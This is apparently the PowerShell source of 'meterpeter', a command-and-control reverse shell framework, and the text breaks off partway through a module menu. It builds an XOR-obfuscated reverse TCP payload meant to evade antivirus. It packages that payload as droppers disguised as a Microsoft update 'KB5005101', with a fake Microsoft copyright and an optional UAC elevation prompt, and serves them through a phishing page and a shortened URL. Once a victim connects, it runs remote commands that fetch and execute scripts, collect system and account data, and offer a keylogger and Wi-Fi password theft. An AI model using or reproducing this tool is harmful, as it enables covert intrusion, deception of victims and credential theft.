<#
.SYNOPSIS
   Author: @ZHacker13 &('r00t-3xp10it')
   Required Dependencies: none ✔
   Optional Dependencies: python3 (windows)|apache2 (Linux)
   PS Script Dev Version: v2.10.11.15
   CodeName: Sagittarius A*

.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/ZHacker13/
#>


#CmdLet auto-settings
$SserverTime = Get-Date -Format "dd/MM/yyyy hh:mm:ss"
$HTTP_PORT = "8087"                 # Python http.server LPort (optional)
$CmdLetVersion = "2.10.11"          # meterpeter C2 version (dont change)
$payload_name = "Update-KB5005101"  # Client-payload filename (dont change)
$Dropper_Name = "Update-KB5005101"  # Payload-dropper filename (optional)
$Modules = @"

  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
 |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
 |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
 Author: @ZHacker13 &('r00t-3xp10it') - SSAredteam @2021 V${CmdLetVersion}


  Command      Command description
  ----------   -------------------
  Info         remote host system information
  Session      Meterpeter C2 connection status
  AdvInfo      Advanced system info [sub-menu]
  Upload       Upload from local host to remote host
  Download     Download from remote host to local host
  Screenshot   Capture remote host desktop screenshots
  keylogger    Install remote host keylooger [sub-menu]
  Settings     Review C2 server\client configurations
  PostExploit  Post-Exploitation modules [sub-menu]
  exit         Exit reverse_tcp_shell [server+client]


"@;


function Char_Obf($String){

  $String = $String.toCharArray();  
  ForEach($Letter in $String)
  {
    $RandomNumber = (1..2) | Get-Random;
    
    If($RandomNumber -eq "1")
    {
      $Letter = "$Letter".ToLower();
    }

    If($RandomNumber -eq "2")
    {
      $Letter = "$Letter".ToUpper();
    }

    $RandomString += $Letter;
    $RandomNumber = $Null;
  }
  
  $String = $RandomString;
  Return $String;
}

function MspCmdScanMe($String){

  $PowerShell = "I`E`X(-Jo" + "in((@)|%{[char](`$_-BX" + "OR #)}));Exit" -join ''
  $Key = '0x' + ((0..5) | Get-Random) + ((0..9) + ((65..70) + (97..102) | % {[char]$_}) | Get-Random)
  $String = ([System.Text.Encoding]::ASCII.GetBytes($String) | % {$_ -BXOR $Key}) -join ',';
  
  $PowerShell = Char_Obf($PowerShell);
  $PowerShell = $PowerShell -replace "@","$String";
  $PowerShell = $PowerShell -replace "#","$Key";

  $CMD = "hello world"
  $CMD = Char_Obf($CMD);
  $CMD = $CMD -replace "@","$String";
  $CMD = $CMD -replace "#","$Key";

  Return $PowerShell,$CMD;
}

function ChkDskInternalFuncio($String){

  $RandomVariable = (0..99);
  For($i = 0; $i -lt $RandomVariable.count; $i++){

    $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));

    While($RandomVariable -like "$Temp"){
      $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));
    }

    $RandomVariable[$i] = $Temp;
    $Temp = $Null;
  }

  $RandomString = $String;

  For($x = $RandomVariable.count; $x -ge 1; $x--){
  	$Temp = $RandomVariable[$x-1];
    $RandomString = "$RandomString" -replace "\`$$x", "`$$Temp";
  }

  $String = $RandomString;
  Return $String;
}

function Payload($IP,$Port,$Base64_Key){

  $dadoninho = "FromBa"+"se64String" -Join ''
  $opbypas = "`$1=[System.Byte[]]::Creat" + "eInstance([System.Byte],10" + "24);`$2=([Convert]::$dadoninho(`"@`"))" -Join ''
  $fdsrsr = "$opbypas;`$3=`"#`";`$4=I`E`X([System.Runtime.Int"+"eropServices.Marshal]::PtrToStr"+"ingAuto([System.Runtime.InteropSe"+"rvices.Marshal]::SecureStringToBSTR((`$3|ConvertTo-SecureString -Key `$2))));While(`$5=`$4.GetStream()){;While(`$5.DataAvailable -or `$6 -eq `$1.count){;`$6=`$5.Read(`$1,0,`$1.length);`$7+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$1,0,`$6)};If(`$7){;`$8=(IEX(`$7)2>&1|Out-String);If(!(`$8.length%`$1.count)){;`$8+=`" `"};`$9=([text.encoding]::ASCII).GetBytes(`$8);`$5.Write(`$9,0,`$9.length);`$5.Flush();`$7=`$Null}}";

  $Key = $([System.Convert]::$dadoninho($Base64_Key))
  $C2 = ConvertTo-SecureString "New-Object System.Net.Sockets.TCPClient('$IP','$Port')" -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;

  $fdsrsr = ChkDskInternalFuncio(Char_Obf($fdsrsr));
  $fdsrsr = $fdsrsr -replace "@","$Base64_Key";
  $fdsrsr = $fdsrsr -replace "#","$C2";

  Return $fdsrsr;
}


Clear-Host;
Write-Host $Modules
$DISTRO_OS = pwd|Select-String -Pattern "/" -SimpleMatch; # <-- (check IF windows|Linux Separator)
If($DISTRO_OS)
{
   ## Linux Distro
   $IPATH = "$pwd/"
   $Flavor = "Linux"
   $Bin = "$pwd/mimiRatz/"
   $APACHE = "/var/www/html/"
}Else{
   ## Windows Distro
   $IPATH = "$pwd\"
   $Flavor = "Windows"
   $Bin = "$pwd\mimiRatz\"
   $APACHE = "$env:LocalAppData\webroot\"
}

$Obfuscation = $null
$Conf_File = "${IPATH}Settings.txt";
If([System.IO.File]::Exists($Conf_File)){
  ## Read Settings From Venom Settings.txt File..
  $LHOST = Get-content $IPATH$Settings|Select-String "IP:"
  $parse = $LHOST -replace "IP:","";$Local_Host = $parse -replace " ","";
  $LPORT = Get-content $IPATH$Settings|Select-String "PORT:"
  $parse = $LPORT -replace "PORT:","";$Local_Port = $parse -replace " ","";
  $OBFUS = Get-content $IPATH$Settings|Select-String "OBFUS:"
  $parse = $OBFUS -replace "OBFUS:","";$Obfuscation = $parse -replace " ","";
  $HTTPP = Get-content $IPATH$Settings|Select-String "HTTPSERVER:"
  $parse = $HTTPP -replace "HTTPSERVER:","";$HTTP_PORT = $parse -replace " ","";
}Else{
  ## User Input Land ..
  Write-Host " - Local Host: " -NoNewline;
  $LHOST = Read-Host;
  $Local_Host = $LHOST -replace " ","";
  Write-Host " - Local Port: " -NoNewline;
  $LPORT = Read-Host;
  $Local_Port = $LPORT -replace " ","";
}
## Default settings
If(-not($Local_Port)){$Local_Port = "666"};
If(-not($Local_Host)){
   If($DISTRO_OS){
      ## Linux Flavor
      $Local_Host = ((ifconfig | grep [0-9].\.)[0]).Split()[-1]
   }else{
      ## Windows Flavor
      $Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
   }
}

If($Flavor -ieq "Windows")
{
   Write-Host "`n`n* Payload dropper format sellection!" -ForegroundColor Black -BackgroundColor Gray
   Write-Host "Id DropperFileName       Format  AVDetection  UacElevation  PsExecutionBypass" -ForegroundColor Green
   Write-Host "-- ---------------       ------  -----------  ------------  -----------------"
   Write-Host "1  Update-KB5005101.bat  BAT     Undetected   optional      true"
   Write-Host "2  Update-KB5005101.hta  HTA     Undetected   false         true"
   Write-Host "3  Update-KB5005101.exe  EXE     Suspicious?  optional      true" -ForegroundColor Yellow
   $FlavorSellection = Read-Host "Id"
}
ElseIf($Flavor -ieq "Linux")
{
   Write-Host "`n`n* Payload dropper format sellection!" -ForegroundColor Black -BackgroundColor Gray
   Write-Host "Id DropperFileName       Format  AVDetection  UacElevation  PsExecutionBypass" -ForegroundColor Green
   Write-Host "-- ---------------       ------  -----------  ------------  -----------------"
   Write-Host "1  Update-KB5005101.bat  BAT     Undetected   optional      true"
   Write-Host "2  Update-KB5005101.hta  HTA     Undetected   false         true"
   $FlavorSellection = Read-Host "Id"
}
## End Of venom Function ..


$Key = (1..32 | % {[byte](Get-Random -Minimum 0 -Maximum 255)});
$Base64_Key = $([System.Convert]::ToBase64String($Key));

Write-Host "`n[*] Generating Payload ✔";
$fdsrsr = Payload -IP $Local_Host -Port $Local_Port -Base64_Key $Base64_Key;

Write-Host "[*] Obfuscation Type: BXOR ✔"
$fdsrsr = MspCmdScanMe($fdsrsr);
Start-Sleep -Milliseconds 1300

Clear-Host;
Write-Host $Modules
Write-Host " - Payload    : $payload_name.ps1"
Write-Host " - Local Host : $Local_Host"
Write-Host " - Local Port : $Local_Port"
Start-Sleep -Milliseconds 1300

$PowerShell_Payload = $fdsrsr[0];
$CMD_Payload = $fdsrsr[1];

Write-Host "`n[*] PowerShell Payload:`n"
Write-Host "$PowerShell_Payload" -ForeGroundColor black -BackGroundColor white


write-host "`n`n"
$My_Output = "$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;
((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "IEX","I``E``X")|Set-Content -Path $IPATH$payload_name.ps1

$check = Test-Path -Path "/var/www/html/";
If($check -ieq $False)
{
  ## Check Attacker python version (http.server)
  $Python_version = python -V|Select-String "3."
  If($Python_version)
  {
    $Webroot_test = Test-Path -Path "$env:LocalAppData\webroot\";
    If($Webroot_test -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\";mkdir $APACHE|Out-Null}else{mkdir $APACHE|Out-Null};
    $Server_port = "$Local_Host"+":"+"$HTTP_PORT";
    ## Attacker: Windows - with python3 installed
    # Deliver Dropper.zip using python http.server
    write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
    write-Host "   ---------    ------                -------               -------";
    write-Host "   Python3      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
    Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force

    If($FlavorSellection -eq 2)
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload HTA dropper application
       #>

       cd $Bin
       #delete old files left behind by previous executions
       If(Test-Path -Path "$Dropper_Name.hta" -EA SilentlyContinue)
       {
          Remove-Item -Path "$Dropper_Name.hta" -Force
       }

       #Make sure HTA template exists before go any further
       If(-not(Test-Path -Path "Update.hta" -EA SilentlyContinue))
       {
          Write-Host "ERROR: file '${Bin}Update.hta' not found ..." -ForeGroundColor Red -BackGroundColor Black
          Write-Host "`n";exit #Exit @Meterpeter
       }
 
       #Replace the  server ip addr + port on HTA template
       ((Get-Content -Path "Update.hta" -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path "Update.hta"

       #Embebed meterpter icon on HTA application?
       #iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null
       #Start-Process -WindowStyle hidden cmd.exe -ArgumentList "/R COPY /B meterpeter.ico+Update.hta $Dropper_Name.hta" -Wait

       Copy-Item -Path "Update.hta" -Destination "$Dropper_Name.hta" -Force
       #Compress HTA application and port the ZIP archive to 'webroot' directory!
       Compress-Archive -LiteralPath "$Dropper_Name.hta" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force

       #Revert original HTA to default to be used again
       ((Get-Content -Path "Update.hta" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "Update.hta"

       #Delete artifacts left behind
       #Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
       Remove-Item -Path "$Dropper_Name.hta" -EA SilentlyContinue -Force

       #return to meterpeter working directory (meterpeter)
       cd $IPATH
    
    }
    ElseIf($FlavorSellection -eq 3)
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload EXE dropper application
       #>

       cd $Bin
       $Dropper_Bat = "Update.ps1"
       $Dropper_Exe = "Update-KB5005101.exe"
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path "$Dropper_Bat"

       #Download the required files from my GITHUB meterpeter repository!
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/PS2EXE/ps2exe.ps1" -OutFile "ps2exe.ps1"|Out-Null
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/PS2EXE/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null

       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated? (y|n)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Secure KB Update" -version "45.19041.692.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "KB5005101" -noError -noConsole -requireAdmin|Out-Null
          Start-Sleep -Seconds 2
       }
       Else
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Secure KB Update" -version "45.19041.692.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "KB5005101" -noError -noConsole|Out-Null
          Start-Sleep -Seconds 2
       }

       #Compress EXE executable and port the ZIP archive to 'webroot' directory!
       Compress-Archive -LiteralPath "$Dropper_Exe" -DestinationPath "$APACHE$Dropper_Name.zip" -Force

       #Revert meterpeter EXE template to default state, after successfully created\compressed the binary dropper (PE)
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "$Dropper_Bat"

       #Clean all artifacts left behind by this function!
       Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
       Remove-Item -Path "$Dropper_Exe" -EA SilentlyContinue -Force
       Remove-Item -Path "ps2exe.ps1" -EA SilentlyContinue -Force
       cd $IPATH
    
    }
    Else
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload BAT dropper script

       #>

       ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
       Copy-Item -Path "$Bin$Dropper_Name.bat" -Destination "${Bin}BACKUP.bat"|Out-Null
       ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path $Bin$Dropper_Name.bat

       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated? (y|n)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {

          <#
          .SYNOPSIS
             Author: @r00t-3xp10it
             Helper - Execute Batch with administrator privileges?

          .NOTES
             This function add's a cmdline to the beggining of bat file that uses
             'Net Session' API to check for admin privs before executing powershell
             -runas on current process spawning a UAC dialogbox of confirmation.
          #>

          #TODO: run bat with admin privs ??? -> requires LanManServer (server) service active
          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
       }

       Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force
       #Revert original BAT to default to be used again
       Remove-Item -Path "$Bin$Dropper_Name.bat" -Force
       Copy-Item -Path "${Bin}BACKUP.bat" -Destination "$Bin$Dropper_Name.bat"|Out-Null
       Remove-Item -Path "${Bin}BACKUP.bat" -Force

    }

    write-Host "[*] Send the URL generated to target to trigger download.";
    Copy-Item -Path "${IPATH}\Mimiratz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
    Copy-Item -Path "${IPATH}\Mimiratz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
    Copy-Item -Path "${IPATH}\Mimiratz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
    ((Get-Content -Path "${APACHE}Update-KB5005101.html" -Raw) -Replace "henrythenavigator","$Dropper_Name")|Set-Content -Path "${APACHE}Update-KB5005101.html"

    Write-Host "[i] Attack Vector: http://$Server_port/$Dropper_Name.html" -ForeGroundColor Black -BackGroundColor white

    #Shorten Url function
    $Url = "http://$Server_port/$Dropper_Name.html"
    $tinyUrlApi = 'http://tinyurl.com/api-create.php'
    $response = Invoke-WebRequest ("{0}?url={1}" -f $tinyUrlApi, $Url)
    $response.Content|Out-File -FilePath "$Env:TMP\sHORTENmE.meterpeter" -Force
    $GetShortenUrl = Get-Content -Path "$Env:TMP\sHORTENmE.meterpeter"
    Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
    Remove-Item -Path "$Env:TMP\sHORTENmE.meterpeter" -Force


    ## Start python http.server (To Deliver Dropper/Payload)
    Start-Process powershell.exe "write-host `" [http.server] Close this Terminal After receving the connection back in meterpeter ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;python -m http.server $HTTP_PORT --bind $Local_Host";
  }else{
    ## Attacker: Windows - without python3 installed
    # Manualy Deliver Dropper.ps1 To Target Machine
    write-Host "   WebServer      Client                Local Path" -ForegroundColor Green;
    write-Host "   ---------      ------                ----------";
    write-Host "   NotInstalled   Update-KB5005101.ps1  $IPATH";write-host "`n`n";
    Write-Host "[i] Manualy Deliver '$payload_name.ps1' (Client) to Target .." -ForeGroundColor Black -BackGroundColor white;
    Write-Host "[*] [Remark] Install Python3 (http.server) to Deliver payloads .." -ForeGroundColor yellow;
  }
}else{
  ## Attacker: Linux - Apache2 webserver
  # Deliver Dropper.zip using Apache2 webserver
  write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
  write-Host "   ---------    ------                -------               -------";
  write-Host "   Apache2      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
  Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force;

  If($FlavorSellection -eq 2)
  {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload HTA dropper application
       #>

       cd $Bin
       #delete old files left behind by previous executions
       If(Test-Path -Path "$Dropper_Name.hta" -EA SilentlyContinue)
       {
          Remove-Item -Path "$Dropper_Name.hta" -Force
       }

       #Make sure HTA template exists before go any further
       If(-not(Test-Path -Path "Update.hta" -EA SilentlyContinue))
       {
          Write-Host "ERROR: file '${Bin}Update.hta' not found ..." -ForeGroundColor Red -BackGroundColor Black
          Write-Host "`n";exit #Exit @Meterpeter
       }
 
       #Replace the  server ip addr + port on HTA template
       ((Get-Content -Path "Update.hta" -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path "Update.hta"

       #Embebed meterpter icon on HTA application?
       #iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null
       #Start-Process -WindowStyle hidden cmd.exe -ArgumentList "/R COPY /B meterpeter.ico+Update.hta $Dropper_Name.hta" -Wait

       #Compress HTA application and port the ZIP archive to 'webroot' directory!
       Compress-Archive -LiteralPath "$Dropper_Name.hta" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force

       #Revert original HTA to default to be used again
       ((Get-Content -Path "Update.hta" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "Update.hta"

       #Delete artifacts left behind
       #Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
       Remove-Item -Path "$Dropper_Name.hta" -EA SilentlyContinue -Force

       #return to meterpeter working directory (meterpeter)
       cd $IPATH
    
    }
    Else
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload BAT dropper script
       #>

       Copy-Item -Path "$Bin$Dropper_Name.bat" -Destination "${Bin}BACKUP.bat"|Out-Null
       ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
       ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Local_Host")|Set-Content -Path $Bin$Dropper_Name.bat;

       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated? (y|n)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {

          <#
          .SYNOPSIS
             Author: @r00t-3xp10it
             Helper - Execute Batch with administrator privileges?

          .NOTES
             This function add's a cmdline to the beggining of bat file that uses
             'Net Session' API to check for admin privs before executing powershell
             -runas on current process spawning a UAC dialogbox of confirmation.
          #>

          #TODO: run bat with admin privs ??? -> requires LanManServer (server) service active
          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
       }

       Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force;
       #Revert original BAT to default to be used again
       Remove-Item -Path "$Bin$Dropper_Name.bat" -Force
       Copy-Item -Path "${Bin}BACKUP.bat" -Destination "$Bin$Dropper_Name.bat"|Out-Null
       Remove-Item -Path "${Bin}BACKUP.bat" -Force

    }


  #write onscreen
  write-Host "[*] Send the URL generated to target to trigger download."
  Copy-Item -Path "${IPATH}\Mimiratz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
  Copy-Item -Path "${IPATH}\Mimiratz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
  Copy-Item -Path "${IPATH}\Mimiratz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
  ((Get-Content -Path "${APACHE}Update-KB5005101.html" -Raw) -Replace "henrythenavigator","$Dropper_Name")|Set-Content -Path "${APACHE}Update-KB5005101.html"

  Write-Host "[i] Attack Vector: http://$Local_Host/$Dropper_Name.html" -ForeGroundColor Black -BackGroundColor white;

  #Shorten Url function
  $Url = "http://$Local_Host/$Dropper_Name.html"
  $tinyUrlApi = 'http://tinyurl.com/api-create.php'
  $response = Invoke-WebRequest ("{0}?url={1}" -f $tinyUrlApi, $Url)
  $response.Content|Out-File -FilePath "$Env:TMP\sHORTENmE.meterpeter" -Force
  $GetShortenUrl = Get-Content -Path "$Env:TMP\sHORTENmE.meterpeter"
  Write-Host "[i] Shorten Uri  : $GetShortenUrl" -ForeGroundColor Black -BackGroundColor white
  Remove-Item -Path "$Env:TMP\sHORTENmE.meterpeter" -Force

}
$check = $Null;
$python_port = $Null;
$Server_port = $Null;
$Python_version = $Null;
## End of venom function


$Bytes = [System.Byte[]]::CreateInstance([System.Byte],1024);
Write-Host "[*] Listening on LPort: $Local_Port tcp";
$Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$Local_Port);
$Socket.Start();
$Client = $Socket.AcceptTcpClient();
$Remote_Host = $Client.Client.RemoteEndPoint.Address.IPAddressToString
Write-Host "[-] Beacon received: $Remote_Host" -ForegroundColor Green
$Stream = $Client.GetStream();

$WaitData = $False;
$Info = $Null;

$RhostWorkingDir = Char_Obf("(Get-location).Path");
$Processor = Char_Obf("(Get-WmiObject Win32_processor).Caption");
$Name = Char_Obf("(Get-WmiObject Win32_OperatingSystem).CSName");
$System = Char_Obf("(Get-WmiObject Win32_OperatingSystem).Caption");
$Version = Char_Obf("(Get-WmiObject Win32_OperatingSystem).Version");
$serial = Char_Obf("(Get-WmiObject Win32_OperatingSystem).SerialNumber");
$syst_dir = Char_Obf("(Get-WmiObject Win32_OperatingSystem).SystemDirectory");
$Architecture = Char_Obf("(Get-WmiObject Win32_OperatingSystem).OSArchitecture");
$WindowsDirectory = Char_Obf("(Get-WmiObject Win32_OperatingSystem).WindowsDirectory");
$RegisteredUser = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).RegisteredUser");
$BootUpTime = Char_Obf("(Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime.ToString()");


#Sysinfo command at first time run (connection)
$Command = "cd `$env:tmp;`"`n   DomainName     : `"+$Name+`"``n   RemoteHost     : `"+`"$Remote_Host`"+`"``n   BootUpTime     : `"+$BootUpTime+`"``n   RegisteredUser : `"+$RegisteredUser+`"``n   OP System      : `"+$System+`"``n   OP Version     : `"+$Version+`"``n   Architecture   : `"+$Architecture+`"``n   WindowsDir     : `"+$WindowsDirectory+`"``n   SystemDir      : `"+$syst_dir+`"``n   SerialNumber   : `"+$serial+`"``n   WorkingDir     : `"+$RhostWorkingDir+`"``n   ProcessorCPU   : `"+$Processor;echo `"`";Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable|ft -AutoSize;If(Get-Process wscript -EA SilentlyContinue){Stop-Process -Name wscript -Force}";


While($Client.Connected)
{
  If(-not ($WaitData))
  {
    If(-not ($Command))
    {
      $Flipflop = "False";
      Write-Host "`n`n - press 'Enter' to continue .." -NoNewline;
      $continue = Read-Host;
      Clear-Host;
      Write-Host $Modules;
      Write-Host "`n :meterpeter> " -NoNewline -ForeGroundColor Green;
      $Command = Read-Host;
    }

    ## venom v1.0.16 function
    If($Command -ieq "settings")
    {
      $Parse = "$IPATH"+"meterpeter.ps1"
      $SerSat = "$Local_Host"+":"+"$Local_Port";
      $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
      If(-not($bool)){$SerPrivileges = "USER_LAND"}else{$SerPrivileges = "*ADMINISTRATOR*"}
      write-host "`n`n Server Settings" -ForegroundColor green;
      write-host " ---------------";
      write-host " meterpeter dev        : ${CmdLetVersion}.15";
      write-host " Local Architecture    : $env:PROCESSOR_ARCHITECTURE";
      write-host " Obfuscation Settings  : BXOR";
      write-host " Server Privileges     : $SerPrivileges";
      write-host " Attacker OS flavor    : $Flavor Distro";
      write-host " Lhost|Lport Settings  : $SerSat";
      write-host " Server Start Time     : $SserverTime"
      write-host " meterpeter WebServer  : $APACHE";
      write-host " meterpeter Server     : $Parse";
    }


    ## venom v1.0.16 function
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ## AdvInfo secondary menu
      write-host "`n`n   Modules   Description" -ForegroundColor green;
      write-host "   -------   -----------";
      write-host "   Accounts  List remote host accounts";
      write-host "   RevShell  List client shell information";
      write-host "   ListAppl  List remote host installed appl";
      write-host "   Processes List remote host processes info";
      write-host "   ListTasks List remote host schedule tasks";
      write-host "   Drives    List remote host active drives";
      write-host "   ListSMB   List remote host SMB names\shares";
      write-host "   AntiVirus List remote host AV Product info";
      write-host "   Cmdkey    List remote cmdkey stored creds";
      write-host "   Recent    List remote host recent directory";
      write-host "   StartUp   List remote host startUp directory";
      write-host "   ListRun   List remote host startup run entrys";
      write-host "   Browser   List remote host installed browsers";
      write-host "   ListDNS   List remote host Domain Name entrys";
      write-host "   TCPinfo   List remote host TCP\UDP connections";
      write-host "   Ipv4info  List remote host IPv4 network statistics";
      write-host "   ListWifi  List remote host Profiles/SSID/Passwords";
      write-host "   PingScan  List devices ip addr\ports\dnsnames on Lan";
      write-host "   GeoLocate List Client GeoLocation using curl ifconfig.me";
      write-host "   FRManager Manage remote host 'active' firewall rules";
      write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
      write-host "`n`n :meterpeter:Adv> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      ## Runing sellected Module(s).
      If($choise -ieq "GeoLocate" -or $choise -ieq "GEO")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow;
         write-host "   -----------"
         write-host "   Geo locate local host and resolve public ip addr";
         write-host "`n`n   Modules   Description                    Remark" -ForegroundColor green;
         write-host "   -------   -----------                    ------";
         write-host "   GeoLocate Client GeoLocation using curl  Client:User - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Geo> " -NoNewline -ForeGroundColor Green;
         $Geo_choise = Read-Host;
         If($Geo_choise -ieq "GeoLocate")
         {
            Write-Host " - Resolve public ip addr? (y|n): " -NoNewline;
            $PublicIpSettings = Read-Host;
            If($PublicIpSettings -iMatch '^(y|yes)$')
            {
               #Execute command remotely
               Write-Host " * Scanning local host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GeoLocation.ps1`" -OutFile `"`$Env:TMP\GeoLocation.ps1`"|Out-Null;powershell -File `$Env:TMP\GeoLocation.ps1 -HiddeMyAss false;Remove-Item -Path `$Env:TMP\GeoLocation.ps1 -Force"
            }
            Else
            {
               #Execute command remotely
               Write-Host " * Scanning local host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GeoLocation.ps1`" -OutFile `"`$Env:TMP\GeoLocation.ps1`"|Out-Null;powershell -File `$Env:TMP\GeoLocation.ps1 -HiddeMyAss true;Remove-Item -Path `$Env:TMP\GeoLocation.ps1 -Force"
            }
         }
         If($Geo_choise -ieq "Return" -or $Geo_choise -ieq "cls" -or $Geo_choise -ieq "Modules")
         {
            $Geo_choise = $null
            $Command = $Null;
         }
      }
      If($choise -ieq "PingScan" -or $choise -ieq "Ping")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow;
         write-host "   -----------"
         write-host "   Module to scan Local Lan for active ip addreses";
         write-host "   and open ports if sellected the 'portscan' module.";
         write-host "   Remark: Scanning for full ipranges takes aprox 2 minuts and" -ForegroundColor Yellow;
         write-host "   more 7 minuts to scan one single ip for openports\hostnames." -ForegroundColor Yellow;
         write-host "`n`n   Modules   Description                            Remark" -ForegroundColor green;
         write-host "   -------   -----------                            ------";
         write-host "   Enum      List active ip addresses on Lan        Client:User - Privileges Required";
         write-host "   PortScan  Lan port scanner \ domain resolver     Client:User - Privileges Required";
         write-host "   AddrScan  Single ip port scanner \ dns resolver  Client:User - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Ping> " -NoNewline -ForeGroundColor Green;
         $ping_choise = Read-Host;
         If($ping_choise -ieq "Enum")
         {
            Write-Host " - Ip addr range to scan (1,255): " -NoNewline
            $IpRange = Read-Host;
            If($IpRange -eq $null -or $IpRange -NotMatch ',')
            {
